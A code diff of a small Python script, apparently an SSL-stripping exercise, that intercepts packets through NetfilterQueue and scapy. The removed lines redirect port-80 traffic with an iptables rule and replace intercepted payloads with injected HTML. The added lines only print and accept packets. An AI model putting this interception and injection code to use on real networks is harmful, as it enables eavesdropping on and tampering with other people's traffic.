@@ -1,29 +1,30 @@
-from scapy.all import *
-import re 
-import os  
 from netfilterqueue import NetfilterQueue
-from threading import Thread
-from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
-from SocketServer import ThreadingMixIn
+from scapy.all import IP
 
-# process intercepted packets
-def process_traffic(packet):
+def process_packet(packet):
     # Convert packet to a Scapy packet
-    p = IP(packet.get_payload())
-
-    #print("Packet intercepted: ")
-    print(p.show())
-
-    packet.set_payload("<html><body><h1>It works! (M3)</h1></body></html>")
+    scapy_packet = IP(packet.get_payload())
+    
+    # Print packet
+    print(scapy_packet.summary())
+    
+    # Accept packet
     packet.accept()
 
-# start SSL stripping attack
-def ssl_strip(interface):
-    # Enable IP forwarding, redirect HTTP traffic to port 10000
-    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
+def ssl_strip():
+    # Create and bind to NetfilterQueue
     queue = NetfilterQueue()
-    queue.bind(0, process_traffic)
-    queue.run()
+    queue.bind(0, process_packet)
+
+    try:
+        print("[+] Starting packet interception...")
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[-] Stopping packet interception...")
+        queue.unbind()
+
+if __name__ == "__main__":
+    ssl_strip()
 
 '''
 todo:
